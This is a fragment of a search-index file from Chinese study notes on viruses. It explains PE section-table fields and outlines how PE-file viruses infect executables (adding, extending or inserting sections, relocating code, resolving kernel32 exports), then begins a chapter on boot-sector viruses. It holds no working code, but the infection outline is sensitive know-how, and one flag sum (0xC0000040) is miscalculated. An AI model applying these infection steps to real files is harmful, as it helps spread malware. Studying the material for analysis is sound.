\u6bcf\u4e2a\u5143\u7d20\u7684\u524d4\u4e2a\u5b57\u8282\u662f\u5730\u5740RVA\uff0c\u540e4\u4e2a\u5b57\u8282\u662f\u8868\u7684\u5927\u5c0f","title":"DataDirectory"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC2%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E6%A6%82%E8%BF%B0/#\u8282\u8868","text":"\u7d27\u63a5\u7740PE\u6587\u4ef6\u5934\u7684\u662f\u8282\u8868\u3002\u8282\u8868\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u7ed3\u6784\u6570\u7ec4\uff0c\u6bcf\u4e2a\u7ed3\u6784\u5305\u542b\u4e86\u4e00\u4e2a\u8282\u7684\u5177\u4f53\u4fe1\u606f\uff08\u6bcf\u4e2a\u7ed3\u6784\u5360\u7528 0x28 \u5b57\u8282\uff09\uff0c\u8be5\u7ed3\u6784\u7684\u5185\u5bb9\u5982\u4e0b\uff1a #define IMAGE_SIZEOF_SHORT_NAME 8 typedef struct _IMAGE_SECTION_HEADER{ BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; // 8\u4e2a\u5b57\u8282\u7684\u8282\u533a\u540d\u79f0 union { DWORD PhysicalAddress; DWORD VirtualSize; //\u5185\u5b58\u4e2d\u8282\u533a\u7684\u5927\u5c0f } Misc; DWORD VirtualAddress; // \u5185\u5b58\u4e2d\u8282\u533a\u7684\u8d77\u59cb\u5730\u5740\uff08RVA\uff09 DWORD SizeOfRawData; // \u78c1\u76d8\u4e2d\u6587\u4ef6\u4e2d\u8282\u533a\u6240\u5360\u5927\u5c0f DWORD PointerToRawData; // \u78c1\u76d8\u4e2d\u6587\u4ef6\u7684\u8d77\u59cb\u4f4d\u7f6e DWORD PointerToRelocations; // \u5728OBJ\u6587\u4ef6\u4e2d\u4f7f\u7528\uff0c\u91cd\u5b9a\u4f4d\u7684\u504f\u79fb DWORD PointerToLinenumbers; // \u884c\u53f7\u8868\u7684\u504f\u79fb\uff08\u4f9b\u8c03\u8bd5\u4f7f\u7528\u5730\uff09 WORD NumberOfRelocations; // \u5728OBJ\u6587\u4ef6\u4e2d\u4f7f\u7528\uff0c\u91cd\u5b9a\u4f4d\u9879\u6570\u76ee WORD NumberOfLinenumbers; // \u884c\u53f7\u8868\u4e2d\u884c\u53f7\u7684\u6570\u76ee DWORD Characteristics; // \u8282\u5c5e\u6027\u5982\u53ef\u8bfb\uff0c\u53ef\u5199\uff0c\u53ef\u6267\u884c\u7b49 } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;","title":"\u8282\u8868"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC2%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E6%A6%82%E8%BF%B0/#text\u8282\u8868","text":"\u5176\u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u51e0\u4e2a\u5b57\u6bb5\uff1a offset 0x1A8-0x1AF \uff1a\u8be5\u5b57\u6bb5\u4e3aName\uff0c\u53ef\u4ee5\u4eceASCII\u7801\u503c\u770b\u51fa\u8be5\u8282\u8868\u5bf9\u5e94\u7684\u8282\u4e3a.text\u8282 offset 0x1B0-0x1B3 \uff1a\u8be5\u5b57\u6bb5\u5728exe\u6587\u4ef6\u4e2d\u4e3aVirtual-Size\uff0c\u8868\u793a\u8282\u7684\u5b9e\u9645\u5b57\u8282\u6570\uff0c\u8fd9\u91cc\u7684\u503c\u4e3a 0x00000046 \u5b57\u8282 offset 0x1B4-0x1B7 \uff1a\u8be5\u5b57\u6bb5\u4e3aVirtualAddress\uff0c\u8868\u793a\u672c\u8282\u8d77\u59cb\u7684\u76f8\u5bf9\u865a\u62df\u5730\u5740\uff08RVA\uff09\uff0c\u8fd9\u91cc\u7684\u503c\u4e3a 0x00001000 offset 0x1BC-0x1BF \uff1a\u8be5\u5b57\u6bb5\u4e3aPointerToRawData\uff0c\u8868\u793a\u672c\u8282\u5728\u78c1\u76d8\u4e2d\u5bf9\u9f50\u540e\u7684\u4f4d\u7f6e\uff0c\u8fd9\u91cc\u7684\u503c\u4e3a 0x00000400 offset 0x1CC-0x1CF \uff1a\u8be5\u5b57\u6bb5\u4e3aCharacteristic\uff0c\u8868\u793a\u8be5\u8282\u7684\u5c5e\u6027\uff0c\u8fd9\u91cc\u7684\u503c\u4e3a 0x60000020 = 0x40000000 + 0x20000000 + 0x20 \uff0c\u8868\u793a\u7684\u610f\u4e49\u662f\u8be5\u8282\u5305\u542b\u4ee3\u7801\uff0c\u5e76\u4e14\u53ef\u8bfb\u53ef\u6267\u884c","title":".text\u8282\u8868"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC2%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E6%A6%82%E8%BF%B0/#rdata\u8282\u8868","text":"\u5176\u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u51e0\u4e2a\u5b57\u6bb5\uff1a offset 0x1D0-0x1D7 \uff1a\u8be5\u5b57\u6bb5\u4e3aName\uff0c\u53ef\u4ee5\u4eceASCII\u7801\u503c\u770b\u51fa\u8be5\u8282\u8868\u5bf9\u5e94\u7684\u8282\u4e3a.rdata\u8282 offset 0x1D8-0x1DB \uff1a\u8be5\u5b57\u6bb5\u5728exe\u6587\u4ef6\u4e2d\u4e3aVirtual-Size\uff0c\u8868\u793a\u8282\u7684\u5b9e\u9645\u5b57\u8282\u6570\uff0c\u8fd9\u91cc\u7684\u503c\u4e3a 0x000000A6 \u5b57\u8282 offset 0x1DC-0x1DF \uff1a\u8be5\u5b57\u6bb5\u4e3aVirtualAddress\uff0c\u8868\u793a\u672c\u8282\u8d77\u59cb\u7684\u76f8\u5bf9\u865a\u62df\u5730\u5740\uff08RVA\uff09\uff0c\u8fd9\u91cc\u7684\u503c\u4e3a 0x00002000 offset 0x1E4-0x1E7 \uff1a\u8be5\u5b57\u6bb5\u4e3aPointerToRawData\uff0c\u8868\u793a\u672c\u8282\u5728\u78c1\u76d8\u4e2d\u5bf9\u9f50\u540e\u7684\u4f4d\u7f6e\uff0c\u8fd9\u91cc\u7684\u503c\u4e3a 0x00000600 offset 0x1F0-0x1F7 \uff1a\u8be5\u5b57\u6bb5\u4e3aCharacteristic\uff0c\u8868\u793a\u8be5\u8282\u7684\u5c5e\u6027\uff0c\u8fd9\u91cc\u7684\u503c\u4e3a 0x40000040 = 0x40000000 + 0x40 \uff0c\u8868\u793a\u7684\u610f\u4e49\u662f\u8be5\u8282\u5305\u542b\u5df2\u521d\u59cb\u5316\u7684\u6570\u636e\uff0c\u5e76\u4e14\u53ef\u8bfb","title":".rdata\u8282\u8868"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC2%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E6%A6%82%E8%BF%B0/#data\u8282\u8868","text":"offset 0x1F8-0x1FF \uff1a\u8be5\u5b57\u6bb5\u4e3aName\uff0c\u53ef\u4ee5\u4eceASCII\u7801\u503c\u770b\u51fa\u8be5\u8282\u8868\u5bf9\u5e94\u7684\u8282\u4e3a.data\u8282 offset 0x200-0x203 \uff1a\u8be5\u5b57\u6bb5\u5728exe\u6587\u4ef6\u4e2d\u4e3aVirtual-Size\uff0c\u8868\u793a\u8282\u7684\u5b9e\u9645\u5b57\u8282\u6570\uff0c\u8fd9\u91cc\u7684\u503c\u4e3a 0x0000008E \u5b57\u8282 offset 0x204-0x207 \uff1a\u8be5\u5b57\u6bb5\u4e3aVirtualAddress\uff0c\u8868\u793a\u672c\u8282\u8d77\u59cb\u7684\u76f8\u5bf9\u865a\u62df\u5730\u5740\uff08RVA\uff09\uff0c\u8fd9\u91cc\u7684\u503c\u4e3a 0x00003000 offset 0x20C-0x20F \uff1a\u8be5\u5b57\u6bb5\u4e3aPointerToRawData\uff0c\u8868\u793a\u672c\u8282\u5728\u78c1\u76d8\u4e2d\u5bf9\u9f50\u540e\u7684\u4f4d\u7f6e\uff0c\u8fd9\u91cc\u7684\u503c\u4e3a 0x00000800 offset 0x21C-0x21F \uff1a\u8be5\u5b57\u6bb5\u4e3aCharacteristic\uff0c\u8868\u793a\u8be5\u8282\u7684\u5c5e\u6027\uff0c\u8fd9\u91cc\u7684\u503c\u4e3a 0xC0000040 = 0x80000000 + 0x40000000 + 0x30 \uff0c\u8868\u793a\u7684\u610f\u4e49\u662f\u8be5\u8282\u5305\u542b\u5df2\u521d\u59cb\u5316\u7684\u6570\u636e\uff0c\u5e76\u4e14\u53ef\u8bfb\u53ef\u5199","title":".data\u8282\u8868"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC2%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E6%A6%82%E8%BF%B0/#text\u8282","text":"\u8fd9\u4e00\u8282\u542b\u6709\u7a0b\u5e8f\u7684\u53ef\u6267\u884c\u4ee3\u7801\uff0c\u6839\u636e\u8282\u8868\u4e2d\u7684\u503c\uff0c\u53ef\u4ee5\u786e\u5b9a.text\u8282\u5728\u6587\u4ef6\u4e2d\u7684\u5730\u5740\u4e3a 0x00000400 \uff0c\u5b9e\u9645\u957f\u5ea6\u4e3a 0x46 \u5b57\u8282\uff0c\u5177\u4f53\u4ee3\u7801\u5982\u4e0b\uff1a","title":".text\u8282"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC2%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E6%A6%82%E8%BF%B0/#rdata\u8282","text":"\u8fd9\u4e00\u8282\u79f0\u4e3a\u5f15\u5165\u51fd\u6570\u8282\uff0c\u5305\u542b\u6709\u4ece\u5176\u4ed6DLL\u4e2d\u5f15\u5165\u7684\u51fd\u6570\uff0c\u6839\u636eIMAGE_DATA_DIRECTORY\u4e2d\u5f15\u5165\u51fd\u6570\u8868\u5730\u5740\u4e3a 0x00002014 \uff0c\u4e14\u6839\u636e\u8282\u8868\uff0c\u8be5\u8868\u5728\u5185\u5b58\u4e2d\u7684\u504f\u79fb\u4e3a 0x00002000 \uff0c\u5373RVA\u4e3a 0x0 \u3002\u6839\u636e\u8282\u8868\uff0c\u8be5\u8282\u4ece\u6587\u4ef6\u504f\u79fb 0x600 \u5904\u5f00\u59cb\uff0c\u90a3\u4e48.rdata\u8868\u5728\u6587\u4ef6\u4e2d\u7684\u504f\u79fb\u5c31\u4e3a 0x614 \u3002\u5927\u5c0f\u4e3a 0xA6 \u5b57\u8282\u3002","title":".rdata\u8282"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC2%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E6%A6%82%E8%BF%B0/#data\u8282","text":".data\u8282\u79f0\u4e3a\u5df2\u521d\u59cb\u5316\u7684\u6570\u636e\u8282\uff0c\u5176\u4e2d\u5b58\u653e\u7684\u662f\u5728\u7f16\u8bd1\u65f6\u523b\u5df2\u7ecf\u786e\u5b9a\u7684\u6570\u636e\u3002\u53ef\u4ee5\u4ece\u8282\u8868\u4e2d\u77e5\u9053\uff0c\u8be5\u8282\u4ece\u6587\u4ef6\u504f\u79fb 0x800 \u5904\u5f00\u59cb\uff0c\u5b9e\u9645\u5927\u5c0f\u4e3a 0x8E \u5b57\u8282\u3002","title":".data\u8282"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC3%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E5%9E%8B%E7%97%85%E6%AF%92/","text":"pe\u6587\u4ef6\u578b\u75c5\u6bd2 # \u75c5\u6bd2\u5982\u4f55\u611f\u67d3PE\u6587\u4ef6 # \u9996\u5148\u5224\u65ad\u6587\u4ef6\u662f\u5426\u662fPE\u6587\u4ef6 \u5982\u4f55\u5224\u65ad\u4e00\u4e2a\u6587\u4ef6\u662f\u5426\u4e3aPE\u6587\u4ef6\uff1f \u68c0\u9a8c\u6587\u4ef6\u5934\u90e8\u7b2c\u4e00\u4e2a\u5b57\u7684\u503c\u662f\u5426\u7b49\u4e8eMZ\uff0c\u5982\u679c\u662f\uff0c\u5219DOS\u5934\u6709\u6548\u3002 \u7528DOS\u5934\u7684\u5b57\u6bb5e_Ifanew\u6765\u5b9a\u4f4dPE\u5934\u3002 \u6bd4\u8f83PE\u5934\u7684\u7b2c\u4e00\u4e2a\u53cc\u5b57\u7684\u503c\u662f\u5426\u7b49\u4e8e50450000H\uff08PE\\0\\0\uff09\u3002 \u63a5\u4e0b\u6765\uff0c\u6dfb\u52a0\u8282 pe\u75c5\u6bd2\u7f16\u5199\u7684\u5173\u952e\u6280\u672f # \u5b9a\u4f4d \u83b7\u5f97API\u51fd\u6570 \u641c\u7d22\u76ee\u6807\u6587\u4ef6 \u611f\u67d3 \u7834\u574f \u4ee3\u7801\u91cd\u5b9a\u4f4d # pe\u6587\u4ef6\u53d8\u91cf\u91cd\u5b9a\u4f4d # \u75c5\u6bd2\u662f\u5728\u5bbf\u4e3b\u7684\u8fd0\u884c\u73af\u5883\u4e0b\u8fd0\u884c\uff0c\u6240\u4ee5\u65e0\u6cd5\u50cf\u5728\u81ea\u5df1\u672c\u8eab\u7684\u8fd0\u884c\u73af\u5883\u4e0b\u4e00\u6837\u8bbf\u95ee\u81ea\u5df1\u7684\u9759\u6001\uff08\u5168\u5c40\uff09\u53d8\u91cf\u7684\u6570\u636e\u548c\u76f4\u63a5\u8c03\u7528\u7cfb\u7edfAPI\u3002 \u52a8\u6001api\u51fd\u6570\u5730\u5740\u83b7\u53d6 # \u5f15\u5165\u8868 # \u5b58\u5728\u4e8e.idata\u533a\u6bb5\uff0c\u5c06.idata\u533a\u5757\u5408\u5e76\u6210\u53e6\u4e00\u4e2a\u533a\u5757\u5df2\u6210\u4e3a\u4e00\u79cd\u60ef\u4f8b\uff0c\u5178\u578b\u7684\u662f.rdata\u533a\u5757 \u5f15\u51fa\u8868 # \u5b58\u5728\u4e8e.edata\u533a\u6bb5\uff0c\u7ecf\u5e38\u88ab\u5408\u5e76\u5230.text\u6216.rdata \u533a\u5757\u4e2d \u5f15\u51fa\u8868\u89e3\u6790\u6d41\u7a0b # kernel32\u5730\u5740\u83b7\u53d6\u65b9\u6cd5 # \u4eceKernel32.dll\u7684\u5bfc\u51fa\u8868\u4e2d\u83b7\u53d6\u67d0\u4e2aAPI\u51fd\u6570\u7684\u5730\u5740 # \u2460\u5728\u540d\u5b57\u8868\u904d\u5386RVA\u5730\u5740\uff0c\u8f6c\u6362\u6210FOA\u5730\u5740\uff0c\u7136\u540e\u6839\u636eFOA\u6bd4\u8f83FOA\u6307\u5411\u7684\u5b57\u7b26\u4e32\u4e0efunc\u662f\u5426\u76f8\u7b49\uff0c\u4e0d\u76f8\u7b49\u5219\u5224\u65ad\u4e0b\u4e00\u4e2a\u3002 \u2461\u5982\u679c\u76f8\u7b49\u5219\u83b7\u53d6\u5230\u5176\u5728\u540d\u5b57\u8868\u4e2d\u7684\u7d22\u5f15(\u4e0b\u6807)\uff0c\u6839\u636e\u8be5\u7d22\u5f15\u83b7\u53d6\u5bf9\u5e94\u7684\u5e8f\u53f7\u8868\u4e2d\u540c\u4e00\u4e0b\u6807\u7d22\u5f15\u5230\u7684\u5e8f\u53f7\u503cvalue\u3002 \u2462value\u4f5c\u4e3a\u5730\u5740\u8868\u7684\u7d22\u5f15\uff0c\u7d22\u5f15\u5230\u7684\u503c\u5373\u4e3afunc()\u7684\u5730\u5740\u3002 \u603b\u7ed3 # \u5982\u4f55\u5224\u65ad\u6587\u4ef6\u662f\u5426\u662fPE\u6587\u4ef6 # \u68c0\u9a8c\u6587\u4ef6\u5934\u90e8\u7b2c\u4e00\u4e2a\u5b57\u7684\u503c\u662f\u5426\u7b49\u4e8eMZ\uff0c\u5982\u679c\u662f\uff0c\u5219DOS\u5934\u6709\u6548\u3002 \u7528DOS\u5934\u7684\u5b57\u6bb5e_lfanew\u6765\u5b9a\u4f4dPE\u5934\u3002 \u6bd4\u8f83PE\u5934\u7684\u7b2c\u4e00\u4e2a\u53cc\u5b57\u7684\u503c\u662f\u5426\u7b49\u4e8e50450000H\uff08PE\\0\\0\uff09\u3002 \u75c5\u6bd2\u611f\u67d3PE\u6587\u4ef6\u7684\u65b9\u5f0f # \u6dfb\u52a0\u8282 # \u6269\u5c55\u8282 # \u63d2\u5165\u8282 #","title":"pe\u6587\u4ef6\u578b\u75c5\u6bd2"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC3%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E5%9E%8B%E7%97%85%E6%AF%92/#pe\u6587\u4ef6\u578b\u75c5\u6bd2","text":"","title":"pe\u6587\u4ef6\u578b\u75c5\u6bd2"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC3%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E5%9E%8B%E7%97%85%E6%AF%92/#\u75c5\u6bd2\u5982\u4f55\u611f\u67d3pe\u6587\u4ef6","text":"\u9996\u5148\u5224\u65ad\u6587\u4ef6\u662f\u5426\u662fPE\u6587\u4ef6 \u5982\u4f55\u5224\u65ad\u4e00\u4e2a\u6587\u4ef6\u662f\u5426\u4e3aPE\u6587\u4ef6\uff1f \u68c0\u9a8c\u6587\u4ef6\u5934\u90e8\u7b2c\u4e00\u4e2a\u5b57\u7684\u503c\u662f\u5426\u7b49\u4e8eMZ\uff0c\u5982\u679c\u662f\uff0c\u5219DOS\u5934\u6709\u6548\u3002 \u7528DOS\u5934\u7684\u5b57\u6bb5e_Ifanew\u6765\u5b9a\u4f4dPE\u5934\u3002 \u6bd4\u8f83PE\u5934\u7684\u7b2c\u4e00\u4e2a\u53cc\u5b57\u7684\u503c\u662f\u5426\u7b49\u4e8e50450000H\uff08PE\\0\\0\uff09\u3002 \u63a5\u4e0b\u6765\uff0c\u6dfb\u52a0\u8282","title":"\u75c5\u6bd2\u5982\u4f55\u611f\u67d3PE\u6587\u4ef6"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC3%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E5%9E%8B%E7%97%85%E6%AF%92/#pe\u75c5\u6bd2\u7f16\u5199\u7684\u5173\u952e\u6280\u672f","text":"\u5b9a\u4f4d \u83b7\u5f97API\u51fd\u6570 \u641c\u7d22\u76ee\u6807\u6587\u4ef6 \u611f\u67d3 \u7834\u574f","title":"pe\u75c5\u6bd2\u7f16\u5199\u7684\u5173\u952e\u6280\u672f"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC3%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E5%9E%8B%E7%97%85%E6%AF%92/#\u4ee3\u7801\u91cd\u5b9a\u4f4d","text":"","title":"\u4ee3\u7801\u91cd\u5b9a\u4f4d"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC3%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E5%9E%8B%E7%97%85%E6%AF%92/#pe\u6587\u4ef6\u53d8\u91cf\u91cd\u5b9a\u4f4d","text":"\u75c5\u6bd2\u662f\u5728\u5bbf\u4e3b\u7684\u8fd0\u884c\u73af\u5883\u4e0b\u8fd0\u884c\uff0c\u6240\u4ee5\u65e0\u6cd5\u50cf\u5728\u81ea\u5df1\u672c\u8eab\u7684\u8fd0\u884c\u73af\u5883\u4e0b\u4e00\u6837\u8bbf\u95ee\u81ea\u5df1\u7684\u9759\u6001\uff08\u5168\u5c40\uff09\u53d8\u91cf\u7684\u6570\u636e\u548c\u76f4\u63a5\u8c03\u7528\u7cfb\u7edfAPI\u3002","title":"pe\u6587\u4ef6\u53d8\u91cf\u91cd\u5b9a\u4f4d"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC3%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E5%9E%8B%E7%97%85%E6%AF%92/#\u52a8\u6001api\u51fd\u6570\u5730\u5740\u83b7\u53d6","text":"","title":"\u52a8\u6001api\u51fd\u6570\u5730\u5740\u83b7\u53d6"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC3%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E5%9E%8B%E7%97%85%E6%AF%92/#\u5f15\u5165\u8868","text":"\u5b58\u5728\u4e8e.idata\u533a\u6bb5\uff0c\u5c06.idata\u533a\u5757\u5408\u5e76\u6210\u53e6\u4e00\u4e2a\u533a\u5757\u5df2\u6210\u4e3a\u4e00\u79cd\u60ef\u4f8b\uff0c\u5178\u578b\u7684\u662f.rdata\u533a\u5757","title":"\u5f15\u5165\u8868"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC3%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E5%9E%8B%E7%97%85%E6%AF%92/#\u5f15\u51fa\u8868","text":"\u5b58\u5728\u4e8e.edata\u533a\u6bb5\uff0c\u7ecf\u5e38\u88ab\u5408\u5e76\u5230.text\u6216.rdata \u533a\u5757\u4e2d","title":"\u5f15\u51fa\u8868"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC3%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E5%9E%8B%E7%97%85%E6%AF%92/#\u5f15\u51fa\u8868\u89e3\u6790\u6d41\u7a0b","text":"","title":"\u5f15\u51fa\u8868\u89e3\u6790\u6d41\u7a0b"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC3%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E5%9E%8B%E7%97%85%E6%AF%92/#kernel32\u5730\u5740\u83b7\u53d6\u65b9\u6cd5","text":"","title":"kernel32\u5730\u5740\u83b7\u53d6\u65b9\u6cd5"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC3%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E5%9E%8B%E7%97%85%E6%AF%92/#\u4ecekernel32dll\u7684\u5bfc\u51fa\u8868\u4e2d\u83b7\u53d6\u67d0\u4e2aapi\u51fd\u6570\u7684\u5730\u5740","text":"\u2460\u5728\u540d\u5b57\u8868\u904d\u5386RVA\u5730\u5740\uff0c\u8f6c\u6362\u6210FOA\u5730\u5740\uff0c\u7136\u540e\u6839\u636eFOA\u6bd4\u8f83FOA\u6307\u5411\u7684\u5b57\u7b26\u4e32\u4e0efunc\u662f\u5426\u76f8\u7b49\uff0c\u4e0d\u76f8\u7b49\u5219\u5224\u65ad\u4e0b\u4e00\u4e2a\u3002 \u2461\u5982\u679c\u76f8\u7b49\u5219\u83b7\u53d6\u5230\u5176\u5728\u540d\u5b57\u8868\u4e2d\u7684\u7d22\u5f15(\u4e0b\u6807)\uff0c\u6839\u636e\u8be5\u7d22\u5f15\u83b7\u53d6\u5bf9\u5e94\u7684\u5e8f\u53f7\u8868\u4e2d\u540c\u4e00\u4e0b\u6807\u7d22\u5f15\u5230\u7684\u5e8f\u53f7\u503cvalue\u3002 \u2462value\u4f5c\u4e3a\u5730\u5740\u8868\u7684\u7d22\u5f15\uff0c\u7d22\u5f15\u5230\u7684\u503c\u5373\u4e3afunc()\u7684\u5730\u5740\u3002","title":"\u4eceKernel32.dll\u7684\u5bfc\u51fa\u8868\u4e2d\u83b7\u53d6\u67d0\u4e2aAPI\u51fd\u6570\u7684\u5730\u5740"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC3%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E5%9E%8B%E7%97%85%E6%AF%92/#\u603b\u7ed3","text":"","title":"\u603b\u7ed3"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC3%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E5%9E%8B%E7%97%85%E6%AF%92/#\u5982\u4f55\u5224\u65ad\u6587\u4ef6\u662f\u5426\u662fpe\u6587\u4ef6","text":"\u68c0\u9a8c\u6587\u4ef6\u5934\u90e8\u7b2c\u4e00\u4e2a\u5b57\u7684\u503c\u662f\u5426\u7b49\u4e8eMZ\uff0c\u5982\u679c\u662f\uff0c\u5219DOS\u5934\u6709\u6548\u3002 \u7528DOS\u5934\u7684\u5b57\u6bb5e_lfanew\u6765\u5b9a\u4f4dPE\u5934\u3002 \u6bd4\u8f83PE\u5934\u7684\u7b2c\u4e00\u4e2a\u53cc\u5b57\u7684\u503c\u662f\u5426\u7b49\u4e8e50450000H\uff08PE\\0\\0\uff09\u3002","title":"\u5982\u4f55\u5224\u65ad\u6587\u4ef6\u662f\u5426\u662fPE\u6587\u4ef6"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC3%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E5%9E%8B%E7%97%85%E6%AF%92/#\u75c5\u6bd2\u611f\u67d3pe\u6587\u4ef6\u7684\u65b9\u5f0f","text":"","title":"\u75c5\u6bd2\u611f\u67d3PE\u6587\u4ef6\u7684\u65b9\u5f0f"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC3%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E5%9E%8B%E7%97%85%E6%AF%92/#\u6dfb\u52a0\u8282","text":"","title":"\u6dfb\u52a0\u8282"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC3%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E5%9E%8B%E7%97%85%E6%AF%92/#\u6269\u5c55\u8282","text":"","title":"\u6269\u5c55\u8282"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC3%E7%AB%A0%20pe%E6%96%87%E4%BB%B6%E5%9E%8B%E7%97%85%E6%AF%92/#\u63d2\u5165\u8282","text":"","title":"\u63d2\u5165\u8282"},{"location":"%E5%AD%A6%E4%B9%A0/%E7%97%85%E6%AF%92/%E7%AC%AC4%E7%AB%A0%20%E5%BC%95%E5%AF%BC%E5%9E%8B%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/","text":"\u7b2c4\u7ae0 \u5f15\u5bfc\u578b\u75c5\u6bd2\u5206\u6790 # \u786c\u76d8\u7269\u7406\u7ed3\u6784 # \u73b0\u5728\u7684\u786c\u76d8\u4e3b\u8981\u5305\u62ec\uff1a\u76d8\u7247\u3001\u78c1\u5934\u3001\u76d8\u4e3b\u8f74\u3001\u63a7\u5236\u7535\u673a\u3001\u78c1\u5934\u63a7\u5236\u5668\u3001\u6570\u636e\u8f6c\u6362\u5668\u3001\u63a5\u53e3\u3001\u7f13\u5b58\u7b49\u51e0\u4e2a\u90e8\u4efd\u3002 \u786c\u76d8\u4e0a\u6240\u6709\u7684\u76d8\u7247\u90fd\u56fa\u5b9a\u5728\u2f00\u4e2a\u65cb\u8f6c\u8f74\u4e0a\uff0c\u8fd9\u4e2a\u8f74\u5373\u76d8\u7247\u4e3b\u8f74\u3002\u5176\u4e2d\u6240\u6709\u76d8\u7247\u4e4b\u95f4\u662f\u7edd\u5bf9\u5e73\u884c\u7684\uff0c\u5728\u6bcf\u4e2a\u76d8\u7247\u7684\u5b58\u50a8\u2faf\u4e0a\u90fd\u6709\u2f00\u4e2a\u78c1\u5934\uff0c\u78c1\u5934\u4e0e\u76d8\u7247\u4e4b\u95f4\u7684\u8ddd\u79bb\u6bd4\u5934\u53d1\u4e1d\u7684\u76f4\u5f84\u8fd8\u8981\u5c0f\u3002 \u6240\u6709\u7684\u78c1\u5934\u90fd\u8fde\u5728\u2f00\u4e2a\u78c1\u5934\u63a7\u5236\u5668\u4e0a\uff0c\u7531\u78c1\u5934\u63a7\u5236\u5668\u8d1f\u8d23\u5404\u4e2a\u78c1\u5934\u7684\u8fd0\u52a8\u3002 \u786c\u76d8\u53c2\u6570 # CHS\uff08Cylinder/Head/Sector\uff09\u53c2\u6570 \u78c1\u5934\u6570\uff08Heads\uff09\u8868\u793a\u786c\u76d8\u603b\u5171\u6709\u51e0\u4e2a\u78c1\u5934\uff0c\u4e5f\u5c31\u662f\u6709\u51e0\u9762\u76d8\u7247\uff0c\u6700\u5927\u4e3a255\uff08\u75288\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u5b58\u50a8\uff09 \u67f1\u9762\u6570\uff08Cylinders\uff09\u8868\u793a\u786c\u76d8\u6bcf\u4e00\u9762\u76d8\u7247\u4e0a\u6709\u51e0\u6761\u78c1\u9053\uff0c\u6700\u5927\u4e3a1023\uff08\u752810\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u5b58\u50a8\uff09\uff1b\u6247\u533a\u6570\uff08Sectors\uff09\u8868\u793a\u6bcf\u4e00\u6761\u78c1\u9053\u4e0a\u6709\u51e0\u4e2a\u6247\u533a\uff0c\u6700\u5927\u4e3a63\uff08\u75286\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u5b58\u50a8\uff09\uff0c\u6bcf\u4e2a\u6247\u533a\u4e00\u822c\u662f512\u4e2a\u5b57\u8282 \u78c1\u76d8\u6700\u5927\u5bb9\u91cf 255 